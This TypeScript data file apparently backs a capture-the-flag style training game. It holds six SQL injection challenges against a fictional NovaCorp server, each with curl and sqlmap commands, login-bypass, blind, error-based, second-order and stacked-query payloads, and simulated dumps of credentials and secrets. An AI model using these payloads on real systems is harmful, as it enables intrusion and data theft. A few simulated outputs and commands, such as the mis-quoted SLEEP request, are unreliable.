export interface SqlTable {
  name: string;
  columns: string[];
  rows: Record<string, string>[];
}

export interface SqlInjectionStep {
  command: string;
  output: string;
  explanation: string;
}

export interface SqlInjectionTarget {
  id: string;
  name: string;
  description: string;
  url: string;
  parameter: string;
  method: 'GET' | 'POST';
  injectable: boolean;
  database: string;
  dbms: string;
  tables: SqlTable[];
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  injectionType: string;
  steps: SqlInjectionStep[];
  flag: string;
  cpReward: number;
}

export const SQL_INJECTION_TARGETS: SqlInjectionTarget[] = [
  {
    id: 'sqli-union-1',
    name: 'NovaCorp Login Portal',
    description: 'A corporate login form vulnerable to classic UNION-based SQL injection. The username field is not properly sanitized.',
    url: 'http://10.0.0.50/login',
    parameter: 'username',
    method: 'POST',
    injectable: true,
    database: 'novacorp',
    dbms: 'MySQL 8.0.35',
    difficulty: 'beginner',
    injectionType: 'UNION-Based',
    tables: [
      {
        name: 'users',
        columns: ['id', 'username', 'password', 'email', 'role'],
        rows: [
          { id: '1', username: 'admin', password: '$2y$10$xVqYLkR5pN3mXz8QrKvZbO', email: 'admin@novacorp.io', role: 'administrator' },
          { id: '2', username: 'jdoe', password: '$2y$10$aB3dEfGhIjKlMnOpQrStUu', email: 'jdoe@novacorp.io', role: 'user' },
          { id: '3', username: 'backup_admin', password: '$2y$10$pQ9rS8tUvWxYzA1bC2dE3f', email: 'backup@novacorp.io', role: 'admin' },
        ],
      },
      {
        name: 'products',
        columns: ['id', 'name', 'price', 'stock'],
        rows: [
          { id: '1', name: 'Security Audit Report', price: '2500', stock: '10' },
          { id: '2', name: 'Pen Test Toolkit', price: '1800', stock: '25' },
        ],
      },
      {
        name: 'orders',
        columns: ['id', 'user_id', 'product_id', 'quantity', 'total'],
        rows: [
          { id: '1', user_id: '2', product_id: '1', quantity: '1', total: '2500' },
        ],
      },
    ],
    steps: [
      {
        command: "curl -X POST http://10.0.0.50/login -d 'username=admin&password=anything'",
        output: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"success":false,"message":"Invalid credentials"}`,
        explanation: 'Test the login form with valid username and wrong password.',
      },
      {
        command: "curl -X POST http://10.0.0.50/login -d \"username=admin' OR '1'='1&password=anything\"",
        output: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"success":true,"message":"Login successful","user":{"id":1,"role":"administrator"}}`,
        explanation: "Classic SQL injection bypass. The payload ' OR '1'='1 makes the WHERE clause always true.",
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/login' --data='username=admin&password=test' --batch --dbs",
        output: `[*] starting @ ...\n[INFO] testing connection to the target URL\n[INFO] testing 'AND boolean-based blind'\n[INFO] the back-end DBMS is MySQL\n[INFO] fetching database names\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] novacorp`,
        explanation: 'sqlmap identifies the database management system and lists available databases.',
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/login' --data='username=admin&password=test' -D novacorp --tables",
        output: `[INFO] fetching tables for database 'novacorp'\nDatabase: novacorp\n[3 tables]\n+----------+\n| users    |\n| products |\n| orders   |\n+----------+`,
        explanation: 'Enumerate tables in the novacorp database.',
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/login' --data='username=admin&password=test' -D novacorp -T users --dump",
        output: `[INFO] fetching entries for 'users'\nTable: users (3 entries)\n+----+--------------+--------------------------+---------------------+---------------+\n| id | username     | password                 | email               | role          |\n+----+--------------+--------------------------+---------------------+---------------+\n| 1  | admin        | $2y$10$xVqYLkR5pN3mXz8Q  | admin@novacorp.io   | administrator |\n| 2  | jdoe         | $2y$10$aB3dEfGhIjKlMnOp  | jdoe@novacorp.io    | user          |\n| 3  | backup_admin | $2y$10$pQ9rS8tUvWxYzA1b  | backup@novacorp.io  | admin         |\n+----+--------------+--------------------------+---------------------+---------------+`,
        explanation: 'Extract all rows from the users table, including password hashes and email addresses.',
      },
    ],
    flag: 'FLAG{sql_union_novacorp_breached}',
    cpReward: 200,
  },
  {
    id: 'sqli-blind-1',
    name: 'NovaCorp Search API',
    description: 'A product search endpoint vulnerable to boolean-based blind SQL injection.',
    url: 'http://10.0.0.50/api/search',
    parameter: 'id',
    method: 'GET',
    injectable: true,
    database: 'novacorp',
    dbms: 'MySQL 8.0.35',
    difficulty: 'intermediate',
    injectionType: 'Boolean-Based Blind',
    tables: [
      {
        name: 'accounts',
        columns: ['id', 'username', 'balance', 'account_type'],
        rows: [
          { id: '1', username: 'admin', balance: '999999.99', account_type: 'admin' },
          { id: '2', username: 'customer1', balance: '1500.00', account_type: 'checking' },
        ],
      },
    ],
    steps: [
      {
        command: "curl 'http://10.0.0.50/api/search?id=1'",
        output: `HTTP/1.1 200 OK\n{"found":true,"product":"Security Camera"}`,
        explanation: 'Normal request returns a product.',
      },
      {
        command: "curl 'http://10.0.0.50/api/search?id=1 AND 1=1'",
        output: `{"found":true,"product":"Security Camera"}`,
        explanation: 'True condition returns the same result.',
      },
      {
        command: "curl 'http://10.0.0.50/api/search?id=1 AND 1=2'",
        output: `{"found":false}`,
        explanation: 'False condition returns empty - confirms blind injection.',
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/api/search?id=1' --batch --technique=B --dbs",
        output: `[INFO] testing 'AND boolean-based blind'\n[INFO] the back-end DBMS is MySQL\navailable databases [2]:\n[*] information_schema\n[*] novacorp`,
        explanation: 'sqlmap confirms boolean-based blind injection.',
      },
    ],
    flag: 'FLAG{sql_blind_boolean_extracted}',
    cpReward: 300,
  },
  {
    id: 'sqli-time-1',
    name: 'NovaCorp User Lookup API',
    description: 'A user lookup endpoint vulnerable to time-based blind SQL injection.',
    url: 'http://10.0.0.50/api/user',
    parameter: 'user',
    method: 'GET',
    injectable: true,
    database: 'novacorp',
    dbms: 'MySQL 8.0.35',
    difficulty: 'advanced',
    injectionType: 'Time-Based Blind',
    tables: [
      {
        name: 'credentials',
        columns: ['id', 'username', 'password_hash', 'api_key'],
        rows: [
          { id: '1', username: 'svc_account', password_hash: '$2y$10$hash...', api_key: 'sk-nova-xxxxxxxxxxxx' },
        ],
      },
    ],
    steps: [
      {
        command: "time curl 'http://10.0.0.50/api/user?user=admin'",
        output: `real\t0m0.032s\nuser\t0m0.010s\nsys\t0m0.005s`,
        explanation: 'Normal response is fast (~32ms).',
      },
      {
        command: "time curl 'http://10.0.0.50/api/user?user=admin' AND SLEEP(5)--'",
        output: `real\t0m5.041s\nuser\t0m0.012s\nsys\t0m0.008s`,
        explanation: 'Response takes 5 seconds - confirms SLEEP injection works.',
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/api/user?user=admin' --batch --technique=T --dbs",
        output: `[INFO] testing 'time-based blind'\n[INFO] the back-end DBMS is MySQL\n[INFO] retrieved database names\navailable databases [2]:\n[*] information_schema\n[*] novacorp`,
        explanation: 'sqlmap confirms time-based blind injection.',
      },
    ],
    flag: 'FLAG{sql_time_sleep_extracted}',
    cpReward: 400,
  },
  {
    id: 'sqli-error-1',
    name: 'NovaCorp Product Catalog',
    description: 'A product category filter vulnerable to error-based SQL injection.',
    url: 'http://10.0.0.50/products',
    parameter: 'category',
    method: 'GET',
    injectable: true,
    database: 'novacorp',
    dbms: 'MySQL 8.0.35',
    difficulty: 'intermediate',
    injectionType: 'Error-Based',
    tables: [
      {
        name: 'secrets',
        columns: ['id', 'key_name', 'key_value'],
        rows: [
          { id: '1', key_name: 'db_password', key_value: 'Sup3rS3cret!' },
          { id: '2', key_name: 'api_token', key_value: 'tok_nv_xxxxxxxxxxxx' },
        ],
      },
    ],
    steps: [
      {
        command: "curl 'http://10.0.0.50/products?category=cameras'",
        output: `[{"id":1,"name":"Security Camera","category":"cameras"},{"id":2,"name":"Dash Cam","category":"cameras"}]`,
        explanation: 'Normal request returns products.',
      },
      {
        command: "curl 'http://10.0.0.50/products?category=camera%27'",
        output: `{"error":"You have an error in your SQL syntax near ''cameras'' at line 1"}`,
        explanation: 'Single quote causes SQL error - confirms injection.',
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/products?category=cameras' --batch --technique=E -D novacorp -T secrets --dump",
        output: `[INFO] testing error-based\n[INFO] the back-end DBMS is MySQL\nTable: secrets (2 entries)\n+----+------------+----------------+\n| id | key_name   | key_value      |\n+----+------------+----------------+\n| 1  | db_password| Sup3rS3cret!   |\n| 2  | api_token  | tok_nv_xxxx    |\n+----+------------+----------------+`,
        explanation: 'Error-based injection extracts the secrets table.',
      },
    ],
    flag: 'FLAG{sql_error_secrets_leaked}',
    cpReward: 300,
  },
  {
    id: 'sqli-second-1',
    name: 'NovaCorp Registration',
    description: 'A registration form vulnerable to second-order SQL injection. The malicious payload is stored and executed later during login.',
    url: 'http://10.0.0.50/register',
    parameter: 'username',
    method: 'POST',
    injectable: true,
    database: 'novacorp',
    dbms: 'PostgreSQL 14',
    difficulty: 'advanced',
    injectionType: 'Second-Order',
    tables: [
      {
        name: 'users',
        columns: ['id', 'username', 'password', 'email', 'is_admin'],
        rows: [
          { id: '1', username: 'admin', password: 'hash1', email: 'admin@novacorp.io', is_admin: 'true' },
        ],
      },
    ],
    steps: [
      {
        command: "curl -X POST http://10.0.0.50/register -d 'username=testuser&password=pass123&email=test@test.com'",
        output: `{"success":true,"message":"Registration successful"}`,
        explanation: 'Register a normal user first.',
      },
      {
        command: "curl -X POST http://10.0.0.50/register -d \"username=admin'-- &password=pass123&email=evil@evil.com\"",
        output: `{"success":true,"message":"Registration successful"}`,
        explanation: "Register with SQL injection payload as username. The payload is stored in the database.",
      },
      {
        command: "curl -X POST http://10.0.0.50/login -d \"username=admin'-- &password=anything\"",
        output: `{"success":true,"message":"Login successful","user":{"id":1,"role":"administrator"}}`,
        explanation: "When logging in, the stored payload executes: admin'-- comments out the password check.",
      },
    ],
    flag: 'FLAG{sql_second_order_admin_access}',
    cpReward: 400,
  },
  {
    id: 'sqli-stacked-1',
    name: 'NovaCorp API Endpoint',
    description: 'An API endpoint vulnerable to stacked queries injection.',
    url: 'http://10.0.0.50/api/order',
    parameter: 'id',
    method: 'GET',
    injectable: true,
    database: 'MySQL 8.0.35',
    dbms: 'MySQL 8.0.35',
    difficulty: 'intermediate',
    injectionType: 'Stacked Queries',
    tables: [
      {
        name: 'orders',
        columns: ['id', 'user_id', 'product', 'amount', 'status'],
        rows: [
          { id: '1', user_id: '1', product: 'Camera', amount: '299.99', status: 'completed' },
        ],
      },
    ],
    steps: [
      {
        command: "curl 'http://10.0.0.50/api/order?id=1'",
        output: `{"id":1,"product":"Camera","amount":299.99,"status":"completed"}`,
        explanation: 'Normal request returns order details.',
      },
      {
        command: "curl 'http://10.0.0.50/api/order?id=1;INSERT INTO orders(user_id,product,amount,status) VALUES(99,'hacked',0.01,'injected')--'",
        output: `{"success":true}`,
        explanation: 'Stacked query inserts a new row into the orders table.',
      },
      {
        command: "curl 'http://10.0.0.50/api/order?id=2'",
        output: `{"id":2,"product":"hacked","amount":0.01,"status":"injected"}`,
        explanation: 'Verify the injected row exists.',
      },
    ],
    flag: 'FLAG{sql_stacked_injected}',
    cpReward: 300,
  },
];
